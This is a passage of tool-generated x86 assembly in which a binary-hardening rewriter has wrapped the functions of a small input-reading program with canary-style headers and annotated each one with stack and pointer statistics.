   .long    Func_0x8049c70  #pp1w: Label_0x8049c70 VAR_ADDRESS #32
   xor     %eax, %eax                         # [39(1577)]   #32
   add     $0xc, %esp                         # [40(1578)]stackSize = 0x0   #32
Label_0x8049719: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x804971a: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x804971a
   .long    Func_0x8049ea0  #pp1w: Label_0x8049ea0 VAR_ADDRESS #32
   mov     $0x1, %eax                         # [43(1581)]   #32
   add     $0xc, %esp                         # [44(1582)]stackSize = 0x0   #32
Label_0x8049727: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049728: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x8049728
   .long    Func_0x8049b70  #pp1w: Label_0x8049b70 VAR_ADDRESS #32
   mov     $0x1, %eax                         # [47(1585)]   #32
   add     $0xc, %esp                         # [48(1586)]stackSize = 0x0   #32
Label_0x8049735: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8049736: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x8049736
   .long    Func_0x8049810  #pp1w: Label_0x8049810 VAR_ADDRESS #32
   mov     $0x1, %eax                         # [51(1589)]   #32
   add     $0xc, %esp                         # [52(1590)]stackSize = 0x0   #32
Label_0x8049743: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:20 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 22
     adding function wrapper

;     Start Index : 1644 (0x8049810)
;       End Index : 1683 (0x80498b0)
;   Num Instructs : 40
;      Stack Size : 20 (0x14)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: true
; Makes Calls: 5
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 4
;     ESP Offsets : 4
;                 :  0x0(0x14), 0x4(0x10), 0x8(0xc), 0xc(0x8); Function Pointers : 1
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4520,7
.p2align 3,0x4525
FuncPtr_0x8049810:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049810,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049810:

Label_0x8049810:
   push    %edi                               # [0(1644)]stackSize = 0x4   #32
   push    %esi                               # [1(1645)]stackSize = 0x8   #32
   sub     $0x14, %esp                        # [2(1646)]stackSize = 0x1c   #32
   movl    $0x3e8, 0xc(%esp)                  # [3(1647)]   #32
   movl    $0x64, 0x8(%esp)                   # [4(1648)]   #32
   movl    $Var_0x804b7a3, 0x4(%esp)          # [5(1649)]   #32
   movl    $0x1, (%esp)                       # [6(1650)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049834
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049839
   .long    Func_0x80498c0  #pp1w: Label_0x80498c0 VAR_ADDRESS #32
   test    %eax, %eax                         # [9(1653)]   #32
   jne     Label_0x8049897 #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049842
   .long    Func_0x8049940  #pp1w: Label_0x8049940 VAR_ADDRESS #32
   mov     %eax, %esi                         # [12(1656)]   #32
   cmp     $-0x1, %esi                        # [13(1657)]   #32
   je      Label_0x8049897 #32
   mov     Var_0x80602ac, %eax                # [15(1659)]   #32
   mov     %esi, (%esp)                       # [16(1660)]   #32
Label_0x8049856: #pn8

   pushl    0x2c(%eax)
   call    _FunctionPointerSearch
                                              # Function Pointer -- absolute address patched
#31
   mov     %eax, %edi                         # [18(1662)]   #32
   test    %edi, %edi                         # [19(1663)]   #32
   jle     Label_0x8049877 #32
   mov     %edi, 0x8(%esp)                    # [21(1665)]   #32
   movl    $Var_0x804b7e3, 0x4(%esp)          # [22(1666)]   #32
   movl    $0x1, (%esp)                       # [23(1667)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049872
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
Label_0x8049877: #p6a
   mov     Var_0x80602b0, %eax                # [25(1669)]   #32
   xor     %ecx, %ecx                         # [26(1670)]   #32
   sub     %esi, %eax                         # [27(1671)]# FLAGS USED   #32
   cmovle  %ecx, %eax                         # [28(1672)]   #32
   mov     %eax, Var_0x80602b0                # [29(1673)]   #32
   add     %edi, Var_0x80604b8                # [30(1674)]   #32
   movb    $0x0, Var_0x80602b4                # [31(1675)]   #32
   jmp     Label_0x80498ab #32
Label_0x8049897: #p6a
   movl    $Var_0x804b7cb, 0x4(%esp)          # [33(1677)]   #32
   movl    $0x1, (%esp)                       # [34(1678)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80498a6
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
Label_0x80498ab: #p6a
   add     $0x14, %esp                        # [36(1680)]stackSize = 0x8   #32
   pop     %esi                               # [37(1681)]stackSize = 0x4   #32
   pop     %edi                               # [38(1682)]stackSize = 0x0   #32
Label_0x80498b0: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:22 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 24
     adding function wrapper

;     Start Index : 1721 (0x8049940)
;       End Index : 1749 (0x80499aa)
;   Num Instructs : 29
;      Stack Size : 24 (0x18)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 3
;     ESP Offsets : 3
;                 :  0x0(0x18), 0x4(0x14), 0x8(0x10); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5120,7
.p2align 3,0x5125
FuncPtr_0x8049940:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049940,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049940:

Label_0x8049940:
   push    %esi                               # [0(1721)]stackSize = 0x4   #32
   sub     $0x18, %esp                        # [1(1722)]stackSize = 0x1c   #32
   mov     $Var_0x80602b5, %esi               # [2(1723)]Loading Variable Pointer 0x80602b5   #32
Label_0x8049950: #p6a
   movsbl  (%esi), %eax                       # [3(1724)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [4(1725)]   #32
   je      Label_0x804996b #32
   add     $0x1, %esi                         # [6(1727)]   #32
   mov     %eax, (%esp)                       # [7(1728)]   #32
   call    Func_0x804a380  #pp1: Label_0x804a380 VAR_ADDRESS #32
   test    %eax, %eax                         # [9(1730)]   #32
   mov     $-0x1, %ecx                        # [10(1731)]# FLAGS USED   #32
   jne     Label_0x8049950 #32
   jmp     Label_0x80499a4 #32
Label_0x804996b: #p6a
   movl    $0xa, 0x8(%esp)                    # [13(1734)]   #32
   movl    $0x0, 0x4(%esp)                    # [14(1735)]   #32
   movl    $Var_0x80602b5, (%esp)             # [15(1736)]   #32
   call    Func_0x804b470  #pp1: Label_0x804b470 VAR_ADDRESS #32
   lea     -0x64(%eax), %ecx                  # [17(1738)] Loading Pointer with stackSize: 28   #32
   cmp     $0x384, %ecx                       # [18(1739)]   #32
   mov     $-0x1, %ecx                        # [19(1740)]# FLAGS USED   #32
   ja      Label_0x80499a4 #32
   mov     Var_0x80602b0, %ecx                # [21(1742)]   #32
   cmp     %eax, %ecx                         # [22(1743)]   #32
   cmovle  %ecx, %eax                         # [23(1744)]   #32
   mov     %eax, %ecx                         # [24(1745)]   #32
Label_0x80499a4: #p6a
   mov     %ecx, %eax                         # [25(1746)]   #32
   add     $0x18, %esp                        # [26(1747)]stackSize = 0x4   #32
   pop     %esi                               # [27(1748)]stackSize = 0x0   #32
Label_0x80499aa: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:24 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 91   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2343 (0x804a3e0)
;       End Index : 2350 (0x804a3f5)
;   Num Instructs : 8
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1420,7
.p2align 3,0x1425
FuncPtr_0x804a3e0:

Func_0x804a3e0:

Label_0x804a3e0:
   mov     0x4(%esp), %eax                    # [0(2343)]   #32
   cmp     $0x7f, %eax                        # [1(2344)]   #32
   sete    %cl                                # [2(2345)]   #32
   cmp     $0x20, %eax                        # [3(2346)]   #32
   setl    %al                                # [4(2347)]   #32
   or      %cl, %al                           # [5(2348)]   #32
   movzbl  %al, %eax                          # [6(2349)]   #32
Label_0x804a3f5: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:91 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 23
     adding function wrapper

;     Start Index : 1684 (0x80498c0)
;       End Index : 1720 (0x804993a)
;   Num Instructs : 37
;      Stack Size : 32 (0x20)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 5
;     ESP Offsets : 5
;                 :  0x0(0x20), 0x4(0x1c), 0x8(0x18), 0xc(0x14),
;                 :  0x1c(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 1
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall receive

;
;-------------------------*/

.p2align 4,0x320,7
.p2align 3,0x325
FuncPtr_0x80498c0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80498c0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80498c0:

Label_0x80498c0:
   push    %ebx                               # [0(1684)]stackSize = 0x4   #32
   push    %edi                               # [1(1685)]stackSize = 0x8   #32
   push    %esi                               # [2(1686)]stackSize = 0xc   #32
   sub     $0x20, %esp                        # [3(1687)]stackSize = 0x2c   #32
   xor     %esi, %esi                         # [4(1688)]   #32
   lea     0x1c(%esp), %ebx                   # [5(1689)] Loading Pointer with stackSize: 44   #32
Label_0x80498d0: #p6a
   lea     Var_0x80602b5(%esi), %edi          # [6(1690)] Loading Pointer with stackSize: 44   #32
   mov     %ebx, 0xc(%esp)                    # [7(1691)]   #32
   mov     %edi, 0x4(%esp)                    # [8(1692)]   #32
   movl    $0x1, 0x8(%esp)                    # [9(1693)]   #32
   movl    $0x0, (%esp)                       # [10(1694)]   #32
   call    _receive                           # [11(1695)]  System Call to receive() #32
   test    %eax, %eax                         # [12(1696)]   #32
   jne     Label_0x804993a #32
   mov     0x1c(%esp), %eax                   # [14(1698)]   #32
   test    %eax, %eax                         # [15(1699)]   #32
   je      Label_0x804993a #32
   cmpb    $0xa, Var_0x80602b5(%esi)          # [17(1701)]Using Global Array Variable
#  PTRCHECK arg[1]    #32
   je      Label_0x8049916 #32
   add     $0x1, %esi                         # [19(1703)]   #32
   cmp     $0x200, %esi                       # [20(1704)]   #32
   jb      Label_0x80498d0 #32
   lea     Var_0x80602b5(%esi), %edi          # [22(1706)] Loading Pointer with stackSize: 44   #32
Label_0x8049916: #p6a
   cmp     $0x200, %esi                       # [23(1707)]   #32
   mov     $-0x1, %ecx                        # [24(1708)]# FLAGS USED   #32
   mov     $0x1, %eax                         # [25(1709)]# FLAGS USED   #32
   cmove   %ecx, %eax                         # [26(1710)]   #32
   cmpb    $0xa, (%edi)                       # [27(1711)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x8049933 #32
   movb    $0x0, (%edi)                       # [29(1713)]Using Pointer PTRCHECK arg[1]  Already checked [27]   #32
   xor     %eax, %eax                         # [30(1714)]   #32
Label_0x8049933: #p6a
   add     $0x20, %esp                        # [31(1715)]stackSize = 0xc   #32
   pop     %esi                               # [32(1716)]stackSize = 0x8   #32
   pop     %edi                               # [33(1717)]stackSize = 0x4   #32
   pop     %ebx                               # [34(1718)]stackSize = 0x0   #32
Label_0x8049939: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x804993a: #p6a
   call    _FuncWrapperHeader      # 2. my address is 0x804993a
   .long    Func_0x80499b0  #pp1w: Label_0x80499b0 VAR_ADDRESS #32
   jmp  Func_0x8049940   # to protect from badPatch

/*;;;;;;;; 
; id:23 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 25
     adding function wrapper

;     Start Index : 1750 (0x80499b0)
;       End Index : 1752 (0x80499ba)
;   Num Instructs : 3
;      Stack Size : 12 (0xc)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 1
;                 :  0x0(0xc)
;      DOES NOT Have True Return; Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall terminate

;
;-------------------------*/

.p2align 4,0x8720,7
.p2align 3,0x8725
FuncPtr_0x80499b0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80499b0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80499b0:

Label_0x80499b0:
   sub     $0xc, %esp                         # [0(1750)]stackSize = 0xc   #32
   movl    $0x0, (%esp)                       # [1(1751)]   #32
   call    _terminate                         # [2(1752)]  System Call to terminate() #32
   jmp  Func_0x80499c0   # to protect from badPatch

/*;;;;;;;; 
; id:25 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 40   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2364 (0x804a430)
;       End Index : 2371 (0x804a445)
;   Num Instructs : 8
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8320,7
.p2align 3,0x8325
FuncPtr_0x804a430:

Func_0x804a430:

Label_0x804a430:
   mov     0x4(%esp), %eax                    # [0(2364)]   #32
   cmp     $0x1f, %eax                        # [1(2365)]   #32
   setg    %cl                                # [2(2366)]   #32
   cmp     $0x7f, %eax                        # [3(2367)]   #32
   setne   %al                                # [4(2368)]   #32
   and     %cl, %al                           # [5(2369)]   #32
   movzbl  %al, %eax                          # [6(2370)]   #32
Label_0x804a445: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:40 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 28
     adding function wrapper

;     Start Index : 1864 (0x8049b70)
;       End Index : 1872 (0x8049b9d)
;   Num Instructs : 9
;      Stack Size : 12 (0xc)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0xc), 0x4(0x8); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x9220,7
.p2align 3,0x9225
FuncPtr_0x8049b70:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8049b70,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8049b70:

Label_0x8049b70:
   sub     $0xc, %esp                         # [0(1864)]stackSize = 0xc   #32
   movb    $0x1, Var_0x80602b4                # [1(1865)]   #32
   movl    $Var_0x804b8ae, (%esp)             # [2(1866)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049b81
   .long    Func_0x80486f0  #pp1w: Label_0x80486f0 VAR_ADDRESS #32
   movl    $Var_0x804b97c, 0x4(%esp)          # [4(1868)]   #32
   movl    $0x1, (%esp)                       # [5(1869)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049b95
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   add     $0xc, %esp                         # [7(1871)]stackSize = 0x0   #32
Label_0x8049b9d: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:28 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 9
     adding function wrapper

;     Start Index : 449 (0x80486f0)
;       End Index : 489 (0x804878c)
;   Num Instructs : 41
;      Stack Size : 36 (0x24)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 4
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 7
;     ESP Offsets : 8
;                 :  0x0(0x24), 0x4(0x20), 0x8(0x1c), 0xc(0x18),
;                 :  0x10(0x14), 0x14(0x10), 0x20(0x4),
;      ESP Params : 
;                 :  0x30(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4520,7
.p2align 3,0x4525
FuncPtr_0x80486f0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80486f0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80486f0:

Label_0x80486f0:
   push    %edi                               # [0(449)]stackSize = 0x4   #32
   push    %esi                               # [1(450)]stackSize = 0x8   #32
   sub     $0x24, %esp                        # [2(451)]stackSize = 0x2c   #32
   mov     0x34(%esp), %edi                   # [3(452)]   #32
   movl    $0x0, 0x20(%esp)                   # [4(453)]   #32
   mov     Var_0x80602a8, %ecx                # [5(454)]   #32
   lea     0x20(%esp), %edx                   # [6(455)] Loading Pointer with stackSize: 44   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804870b
   .long    Func_0x8048790  #pp1w: Label_0x8048790 VAR_ADDRESS #32
   mov     0x20(%esp), %esi                   # [8(457)]   #32
   mov     %edi, 0x8(%esp)                    # [9(458)]   #32
   movl    $Var_0x804b708, 0x4(%esp)          # [10(459)]   #32
   movl    $0x1, (%esp)                       # [11(460)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048727
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   jmp     Label_0x8048762 #32
   xchg    %ax, %ax                           # [14(463)]   #32
Label_0x8048730: #p6a
   mov     (%esi), %eax                       # [15(464)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%esi), %ecx                    # [16(465)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x8(%esi), %edx                    # [17(466)]Using Pointer PTRCHECK arg[0]    #32
   mov     0xc(%esi), %edi                    # [18(467)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edi, 0x14(%esp)                   # [19(468)]   #32
   mov     %edx, 0x10(%esp)                   # [20(469)]   #32
   mov     %ecx, 0xc(%esp)                    # [21(470)]   #32
   mov     %eax, 0x8(%esp)                    # [22(471)]   #32
   movl    $Var_0x804b70b, 0x4(%esp)          # [23(472)]   #32
   movl    $0x1, (%esp)                       # [24(473)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804875a
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     0x14(%esi), %esi                   # [26(475)]Using Pointer PTRCHECK arg[0]    #32
Label_0x8048762: #p6a
   test    %esi, %esi                         # [27(476)]   #32
   jne     Label_0x8048730 #32
   jmp     Label_0x804877f #32
Label_0x8048770: #p6a
   mov     0x14(%eax), %ecx                   # [30(479)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ecx, 0x20(%esp)                   # [31(480)]   #32
   mov     %eax, (%esp)                       # [32(481)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804877a
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
Label_0x804877f: #p6a
   mov     0x20(%esp), %eax                   # [34(483)]   #32
   test    %eax, %eax                         # [35(484)]   #32
   jne     Label_0x8048770 #32
   add     $0x24, %esp                        # [37(486)]stackSize = 0x8   #32
   pop     %esi                               # [38(487)]stackSize = 0x4   #32
   pop     %edi                               # [39(488)]stackSize = 0x0   #32
Label_0x804878c: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:9 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 72   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2372 (0x804a450)
;       End Index : 2374 (0x804a45b)
;   Num Instructs : 3
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2120,7
.p2align 3,0x2125
FuncPtr_0x804a450:

Func_0x804a450:

Label_0x804a450:
   mov     0x4(%esp), %eax                    # [0(2372)]   #32
   movzbl  Var_0x804bbaa(%eax), %eax          # [1(2373)]Using Global Array Variable
#  PTRCHECK arg[0]    #32
Label_0x804a45b: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:72 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 85   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2375 (0x804a460)
;       End Index : 2383 (0x804a478)
;   Num Instructs : 9
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5220,7
.p2align 3,0x5225
FuncPtr_0x804a460:

Func_0x804a460:

Label_0x804a460:
   mov     0x4(%esp), %eax                    # [0(2375)]   #32
   lea     -0x9(%eax), %ecx                   # [1(2376)] Loading Pointer with stackSize: 0   #32
   cmp     $0x5, %ecx                         # [2(2377)]   #32
   setb    %cl                                # [3(2378)]   #32
   cmp     $0x20, %eax                        # [4(2379)]   #32
   sete    %al                                # [5(2380)]   #32
   or      %cl, %al                           # [6(2381)]   #32
   movzbl  %al, %eax                          # [7(2382)]   #32
Label_0x804a478: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:85 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 92   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2384 (0x804a480)
;       End Index : 2386 (0x804a48b)
;   Num Instructs : 3
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5520,7
.p2align 3,0x5525
FuncPtr_0x804a480:

Func_0x804a480:

Label_0x804a480:
   mov     0x4(%esp), %eax                    # [0(2384)]   #32
   movzbl  Var_0x804bc2a(%eax), %eax          # [1(2385)]Using Global Array Variable
#  PTRCHECK arg[0]    #32
Label_0x804a48b: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:92 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 97   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2387 (0x804a490)
;       End Index : 2389 (0x804a497)
;   Num Instructs : 3
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5320,7
.p2align 3,0x5325
FuncPtr_0x804a490:

Func_0x804a490:

Label_0x804a490:
   mov     0x4(%esp), %eax                    # [0(2387)]   #32
   and     $0x7f, %eax                        # [1(2388)]   #32
Label_0x804a497: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:97 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 46   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 2602 (0x804a770)
;       End Index : 2609 (0x804a78f)
;   Num Instructs : 8
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x8820,7
.p2align 3,0x8825
FuncPtr_0x804a770:

Func_0x804a770:

Label_0x804a770:
   xor     %eax, %eax                         # [0(2602)]   #32
   mov     0x4(%esp), %ecx                    # [1(2603)]   #32
Label_0x804a780: #p6a
   cmp     %ecx, Var_0x804c010(, %eax ,  0x4) # [2(2604)]Using Global Array Variable
#  PTRCHECK arg[1]    #32
   jae     Label_0x804a78f #32
   add     $0x1, %eax                         # [4(2606)]   #32
   cmp     $0x1f, %eax                        # [5(2607)]   #32
   jle     Label_0x804a780 #32
Label_0x804a78f: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:46 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 48
     adding function wrapper

;     Start Index : 2630 (0x804a7e0)
;       End Index : 2655 (0x804a838)
;   Num Instructs : 26
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 6
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5420,7
.p2align 3,0x5425
FuncPtr_0x804a7e0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a7e0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a7e0:

Label_0x804a7e0:
   push    %esi                               # [0(2630)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2631)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2632)]   #32
   mov     (%esi), %eax                       # [3(2633)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [4(2634)]   #32
